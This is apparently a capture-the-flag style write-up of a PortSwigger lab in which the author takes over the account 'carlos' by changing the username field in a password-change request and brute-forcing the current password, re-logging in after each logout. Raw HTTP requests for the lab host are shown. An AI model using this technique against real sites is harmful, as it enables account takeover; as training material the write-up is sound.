# [Password brute-force via password change](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-brute-force-via-password-change)

My first lab while recording a [YouTube video](https://youtu.be/VtFQBJqdTR4). Awesome!

Youtube video link: https://youtu.be/VtFQBJqdTR4

# Thought Process

- Given the lab's title, and the description, I immediately logged in to my account `wiener:peter` and reset my password.

- I found that entering the wrong password, cuases a 302 redirect back to `/login` which is the hint that we can use to know that the current password we entered is wrong.

- I also noticed that the reset password includes the username of the user that we're trying to reset the password for:

```
POST /my-account/change-password HTTP/2
Host: 0a5500650340971d828f3d0300490019.web-security-academy.net
Cookie: session=JuwFj05BXWZ29w7gm6mYfg1KAXzDyKGn; session=vQMeWCgujr98vQFwNdAebxqi2qmR0rlC
Content-Length: 80
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://0a5500650340971d828f3d0300490019.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500650340971d828f3d0300490019.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Priority: u=0, i

username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter
```

- I also noticed we have 2 session cookies. Weird.

- Turns out the 2 sessions are unrelated and was perhaps just a weird something that I don't know. Nevertheless, not what we are looking for.

- A heads up; I already solved the lab by this point on video which I'll be posting the URL to at the end of this writeup when the video has been uploaded to YouTube.

- Now going through my thoughts again, I tried to change the password by changing the `username` field in the above request, but this caused a `302` response and a logout. This means that every time that we use an incorrect `current-password` value, we actually get logged out from the account but, we don't actually get locked out of the account.

- So, simply, we can just re-login, grab the new session from the new login, and attempt to change the password again.

- To achieve this, I simply created a PHP script (and struggled a bit since I'm SUPER rusty in pure curl in PHP, this is clearly shown in the YouTube video) that automated the process of sending a change password request, and then logging in if we DON'T get a `200` response back (which means we probably got the `302` redirect response which also logged us out.)

- The script is made in PHP becaue of biased reasons. You can view the script here in this folder next to this README. `./brute-force-password-change.php`

- The final request form to reset the password is:

```
POST /my-account/change-password HTTP/2
Host: 0a5500650340971d828f3d0300490019.web-security-academy.net
Content-Length: 80
Cookie: session=RXgdauVqta3LfrbGluEvvqyZmazoaUw8
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://0a5500650340971d828f3d0300490019.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500650340971d828f3d0300490019.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Priority: u=0, i

username=carlos&current-password=peter&new-password-1=peter&new-password-2=peter
```

- This request resets the password for `carlos` to be `peter`, the same as our account. then we can simply login using `carlos:peter` and this will solve the lab immediately.